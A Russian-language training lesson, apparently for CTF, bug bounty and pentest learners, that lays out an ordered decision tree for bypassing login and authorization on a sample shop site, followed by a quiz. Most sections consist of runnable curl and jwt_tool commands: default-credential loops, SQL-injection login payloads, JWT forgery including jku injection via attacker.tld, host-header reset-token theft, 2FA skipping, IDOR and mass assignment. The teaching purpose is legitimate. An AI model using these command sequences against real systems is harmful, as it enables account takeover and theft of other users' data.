---
id: web-playbook-auth-bypass
title: "Плейбук: обход аутентификации и авторизации"
category: web
parent: web-playbooks-exploit
difficulty: hard
order: 1
tags: [playbook, auth, jwt, session, idor, password-reset, 2fa, decision-tree, web]
prerequisites: [web-auth-core, web-auth-jwt-idor, web-playbook-recon-to-foothold]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 36
summary: "Упорядоченное decision-tree от «нашёл форму логина» до доступа: дефолтные креды → SQLi-обход → JWT → сессии → сброс пароля → 2FA → IDOR."
---

## Задача

Ты нашёл на `https://shop.target.local` форму логина. Это точка входа, а не тупик. Вопрос всегда один: **в каком порядке пробовать обход**, чтобы не потратить часы на брутфорс, когда рядом лежит дефолтный `admin:admin` или подделываемый JWT.

Этот плейбук задаёт порядок веток: от самых дешёвых (дефолтные креды) к сложным (JWT-подделка, гонки в сбросе пароля, IDOR).

## Данные, с которыми работаем

Форма `POST /login` (`username`/`password`), cookie с токеном, эндпоинт `/api/orders/{id}`. Пройдём по дереву.

## Дерево решения

```
[форма логина / админ-панель / токен]
   ├─(1) ДЕФОЛТНЫЕ креды + username enumeration ──► [доступ] → (7)
   ├─(2) SQLi-ОБХОД логина (' OR 1=1-- -) ─────────► [доступ] → (7)
   ├─(3) ТОКЕНЫ: JWT (none/confusion/слабый/jku/kid)
   ├─(4) СЕССИИ: фиксация, logout, cookie-атрибуты
   ├─(5) СБРОС ПАРОЛЯ: токен, host header, гонка
   ├─(6) 2FA: лимит попыток, пропуск шага
   └─(7) АВТОРИЗАЦИЯ: IDOR, privesc, mass assignment ──► [чужой аккаунт]
```

## Шаг 1: дефолтные креды и enumeration

Самая дешёвая ветка — начинать всегда с неё. **Никогда не начинай с `rockyou`** на живой сервис.

```bash
$ for c in admin:admin admin:password root:root guest:guest; do
    u=${c%%:*}; p=${c##*:}
    code=$(curl -s -o /dev/null -w '%{http_code}' -u "$u:$p" https://shop.target.local/admin/)
    echo "$c -> $code"
  done
admin:admin -> 401
admin:password -> 302            # редирект после входа -> успех

# enumeration: разный ответ на существующего/несуществующего пользователя
$ curl -s -o /dev/null -w '%{size_download}\n' -d 'username=admin&password=x' https://shop.target.local/login
5211
$ curl -s -o /dev/null -w '%{size_download}\n' -d 'username=nosuch_zz&password=x' https://shop.target.local/login
4821
```

**Условие ветвления:** есть дефолт/демо-аккаунт → вошли, иди в шаг 7. Разная реакция на существующего пользователя → у тебя валидный список логинов для шага 2/5.

## Шаг 2: SQLi-обход логина

Если форма конкатенирует SQL, кавычка даст ошибку, а логические тавтологии — обход:

```bash
$ for p in "' OR '1'='1'-- -" "admin'-- -" "') OR ('1'='1'-- -"; do
    echo "== $p"
    curl -s -o /dev/null -w 'code=%{http_code} size=%{size_download}\n' \
      --data-urlencode "username=admin" --data-urlencode "password=$p" https://shop.target.local/login
  done
== ' OR '1'='1'-- -   code=302 size=0     # редирект -> обход сработал
```

**Условие ветвления:** обход сработал → ты в приложении под первым пользователем из запроса; далее дамп юзеров и шаг 7. Не сработал, но ошибки SQL видны → это всё ещё SQLi-точка, иди в `web-playbook-injection-triage`.

## Шаг 3: токены — JWT и opaque

```bash
$ jwt_tool eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjF9.XXXX

$ jwt_tool $TOKEN -X a                          # alg:none
$ jwt_tool $TOKEN -X k -pk pub.pem              # RS256 -> HS256 confusion
$ jwt_tool $TOKEN -C -d jwt-secrets.txt         # слабый HMAC (офлайн)
$ jwt_tool $TOKEN -X s -ju https://attacker.tld/jwks.json   # jku injection
```

**Условие ветвления:** подделал токен → установи его, смени claim (`uid`/`role`/`sub`) на жертву/админа → шаг 7. Не подделал → проверь, не проверяется ли подпись вообще (поменяй байт в payload).

## Шаг 4: сессии — фиксация и слабые cookie

```bash
$ curl -sI https://shop.target.local/login | grep -i set-cookie
Set-Cookie: session=abc123; Path=/          # нет HttpOnly/SameSite/Secure

# фиксация: до логина и после — тот же ID?
$ curl -s -c pre.txt https://shop.target.local/ -o /dev/null
$ curl -s -b pre.txt -c post.txt -d 'username=u&password=p' https://shop.target.local/login -o /dev/null
$ diff <(cut -f6,7 pre.txt) <(cut -f6,7 post.txt)
```

**Условие ветвления:** ID не меняется после логина (фиксация) → можно подготовить сессию для жертвы. Cookie без `HttpOnly` → угон через XSS. «Logout» не инвалидирует → украденная сессия живёт вечно.

## Шаг 5: сброс пароля

```bash
$ curl -s -i -d 'email=victim@shop.target.local' -H 'Host: attacker.tld' \
    https://shop.target.local/forgot | grep -i 'location\|reset\|token'
Location: https://attacker.tld/reset?token=abc123    # host header injection!

# предсказуемость токена: два сброса подряд
$ curl -s -d 'email=a@shop.target.local' https://shop.target.local/forgot
$ curl -s -d 'email=a@shop.target.local' https://shop.target.local/forgot
```

**Условие ветвления:** токен предсказуем или ушёл на твой host → перехватываешь сброс → задаёшь свой пароль → вход под жертвой. Не вышло → проверь IDOR в сбросе (`user_id` другого пользователя).

## Шаг 6: 2FA

```bash
# нет лимита попыток? (НЕ брутить 000000-999999 — это lockout/DoS)
$ for code in 000000 111111 123456; do
    curl -s -o /dev/null -w "$code -> %{http_code}\n" \
      -b "session=$S" -d "otp=$code" https://shop.target.local/2fa/verify
  done

# обход: пропуск шага 2FA прямым переходом
$ curl -s -b "session=$S" https://shop.target.local/dashboard -o /dev/null -w '%{http_code}\n'
200                              # внутренняя страница без 2FA -> проверка не на сервере
```

## Шаг 7: авторизация — IDOR и эскалация

```bash
$ curl -s -b "session=$S" https://shop.target.local/api/orders/1001 | jq .user_id
1001
$ curl -s -b "session=$S" https://shop.target.local/api/orders/1002 | jq .user_id
1002                             # чужой заказ -> IDOR

# mass assignment
$ curl -s -b "session=$S" -H 'Content-Type: application/json' \
    -d '{"name":"me","role":"admin","isAdmin":true}' https://shop.target.local/api/me | jq .
```

**Условие ветвления:** получил чужой объект или админ-функцию → подтверждённый IDOR/privesc, фиксируй доказательство. Только `403` → вернись на шаг 3/4.

## Полный прогон от начала до конца

1. Дефолтные креды → `admin:password` дал `302`.
2. Внутри — `GET /api/orders/1001` → свой заказ.
3. Смена на `1002` → чужой заказ (`user_id:1002`) → IDOR.
4. Проверка вертикали: `/api/admin/users` обычным токеном → `403` (нужен другой токен).
5. Артефакт: чужие данные в ответе.

## Если не сработало — пробуй это

- **Всё 200, но это страница логина.** Проверяй не код, а наличие чувствительного контента (`jq .id`, grep по имени).
- **Брутфорс даёт «too many attempts».** Это и есть находка (нет rate-limit). Не долби дальше.
- **JWT не подделывается.** Проверь `kid` (path traversal/SQLi), `jku`/`x5u`, отсутствие проверки `aud`/`iss`.
- **OAuth/OIDC вместо пароля.** Смотри `web-oauth-oidc-saml`, `web-sso-mixup` — там `redirect_uri` и mix-up.
- **Есть регистрация.** Пробуй занять `admin`, дубликаты email, приглашения в организацию.

## Тупики

- Онлайн-брутфорс большого словаря — дорого, шумно, часто с локом. Только маленький набор + офлайн-крекинг.
- Подделывать **opaque**-токен без понимания формата — сначала собери несколько и сравни.
- Игнорировать rate-limit как находку — отсутствие лимита само уязвимость.
- Ковырять фронтенд-валидацию вместо сервера — обход делается серверным запросом.
- Трактовать `200 OK` как доступ без проверки, что вернулись чужие данные.

## Что мы теперь знаем

- Порядок веток: дефолты → SQLi-обход → токены → сессии → сброс → 2FA → авторизация.
- Дешёвые ветки (дефолтные креды) идут раньше дорогого брутфорса.
- JWT ломается предсказуемо: none/confusion/слабый секрет/jku/kid.
- Host header injection в сбросе уводит токен на чужой хост.
- IDOR подтверждается **чужими** данными, а не кодом 200.

## На что смотреть дальше

- **Онлайн-брутфорс — EV-минус.** Только дефолты и топ-100, офлайн — hashcat.
- **Rate-limit как находка.** Отсутствие лимита — отдельная уязвимость.
- **Opaque-токены.** Сравнивай несколько значений на предсказуемость.
- **Вертикаль vs горизонталь.** IDOR — горизонталь; доступ к админ-API — вертикаль.
- **Стабилизация.** Полученный доступ — точка входа дальше, не финал.

## Квиз

Проверь себя.

```quiz
- question: "С чего начинать при находке панели логина?"
  options:
    - "С полного брутфорса rockyou"
    - "С дефолтных и типовых кредов + enumeration пользователей"
    - "С SSRF"
    - "С подделки JWT, даже если JWT нет"
  answer: 1
  explanation: "Сначала проверяют дешёвые ветки: дефолтные креды и перечисление пользователей."
- question: "Какой payload классически обходит конкатенирующий SQL-логин?"
  options:
    - "<script>alert(1)</script>"
    - "' OR '1'='1'-- -"
    - "../../etc/passwd"
    - "{{7*7}}"
  answer: 1
  explanation: "Логическая тавтология в кавычках обходит проверку пароля при конкатенации SQL."
- question: "Токен с заголовком alg=RS256, а вы подставляете HS256 с публичным ключом как секретом. Как это называется?"
  options:
    - "Фиксация сессии"
    - "Algorithm confusion (alg-confusion)"
    - "CSRF"
    - "Mass assignment"
  answer: 1
  explanation: "Подмена RS256 на HS256 с публичным ключом — классический algorithm confusion."
- question: "Сервер отдаёт 200 на чужой /api/orders/1002. Что нужно проверить, прежде чем заявить IDOR?"
  options:
    - "Что в ответе действительно данные ДРУГОГО пользователя"
    - "Что ответ быстрый"
    - "Что стоит заголовок Content-Type"
    - "Что сервер на nginx"
  answer: 0
  explanation: "IDOR подтверждается только чужими данными в ответе, а не кодом 200."
- question: "Форма сброса пароля принимает произвольный Host. Чем это опасно?"
  options:
    - "Ничем"
    - "Ссылка с токеном сброса может уйти на подконтрольный атакующему хост"
    - "Ломается вёрстка"
    - "Сервер перезагрузится"
  answer: 1
  explanation: "Host header injection уводит ссылку с токеном сброса на чужой домен."
```

## Куда дальше

Дальше (`web-playbook-file-to-rce`) мы разберём путь от файлового примитива (upload/LFI/traversal) до исполнения кода. А пока главное запомни: порядок веток экономит часы — дефолтные креды проверяются до единого брутфорса.

## Где пригодится

- **CTF (Web):** быстро перебрать ветки обхода аутентификации под таймером.
- **Bug bounty:** приоритизация дешёвых веток и корректное подтверждение IDOR/токенов.
- **Пентест:** единый маршрут по auth/authz с доказательствами для отчёта.
- **Работа (AppSec):** понимание, где чаще всего ломается сессия, JWT и сброс пароля.
